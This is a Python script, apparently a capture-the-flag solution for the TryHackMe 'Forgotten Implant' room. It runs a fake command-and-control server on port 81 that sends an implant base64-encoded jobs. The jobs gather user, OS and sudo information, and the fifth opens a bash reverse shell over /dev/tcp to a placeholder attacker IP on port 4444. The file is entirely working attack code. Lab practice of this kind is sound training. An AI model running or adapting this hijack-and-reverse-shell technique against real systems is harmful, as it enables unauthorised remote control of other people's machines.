"""
Author      : AnyGuy
Date        : 2023-08-02

Title       : forgotten-implant.py

Description : TryHackMe CTF - https://tryhackme.com/room/forgottenimplant
    
    - Respond on Port 81 in JSON format
    - Communicate with target machine over Port 81

"""

# Import Libraries
# Import the http.server module, which provides a basic request handler for HTTP servers.
# Import the socketserver module, which provides a framework for network servers.
# Import the base64 module, which provides functions to encode and decode binary data to ASCII strings following the Base64 encoding scheme.
import http.server
import socketserver
import base64

# Define the port number on which the server will listen. This can be any unused port on the system.
PORT = 81

# Define a custom request handler by subclassing http.server.SimpleHTTPRequestHandler.
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    counter = 0  # Counter for the number of GET requests

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        if self.counter == 0:
            data = b'{"job_id": 15, "cmd": "whoami"}'
        elif self.counter == 1:
            data = b'{"job_id": 15, "cmd": "getent passwd"}'
        elif self.counter == 2:
            data = b'{"job_id": 15, "cmd": "lsb_release -a"}'
        elif self.counter == 3:
            data = b'{"job_id": 15, "cmd": "sudo -l"}'
        elif self.counter == 4:
            data = b'{"job_id": 15, "cmd": "bash -c \'0<&75-;exec 75<>/dev/tcp/YOUR-IP/4444;sh <&75 >&75 2>&75\'"}'
        else:
            data = b'{"job_id": 15, "cmd": "pwd"}'  # Default response

        encoded_data = base64.b64encode(data)
        self.wfile.write(encoded_data)

        self.counter += 1  # Increment the counter after every GET request

# Create an instance of TCPServer, binding it to all available interfaces (specified by the empty string) and the defined port.
# Use the custom request handler for the server.
# The 'with' statement is used here to ensure that the server is properly cleaned up when it is no longer needed.
with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    # Print a message indicating that the server is listening. This will appear in the console.
    print("Server listening on port", PORT)
    # Start the server. This will make the server start listening for incoming connections, and it will process each incoming request in a new thread.
    # The server will keep running indefinitely because of the 'serve_forever' method.
    httpd.serve_forever()
